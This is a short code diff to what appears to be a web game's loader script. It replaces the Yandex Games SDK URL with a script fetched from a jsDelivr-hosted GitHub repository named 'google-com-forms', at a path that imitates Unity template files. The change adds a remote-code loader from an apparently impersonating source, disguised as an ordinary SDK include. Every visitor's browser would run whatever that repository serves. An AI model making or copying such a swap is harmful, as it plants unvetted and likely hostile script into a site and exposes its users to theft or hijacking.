@@ -22,7 +22,7 @@ let opt = { screen: { fullscreen: false } };
   (function (d) {
     var t = d.getElementsByTagName('script')[0];
     var s = d.createElement('script');
-    s.src = 'https://yandex.ru/games/sdk/v2';
+    s.src = 'https://cdn.jsdelivr.net/gh/google-com-forms/575@main/TemplateData/v2.js';
     s.async = true;
     t.parentNode.insertBefore(s, t);
     s.onload = initSDK;
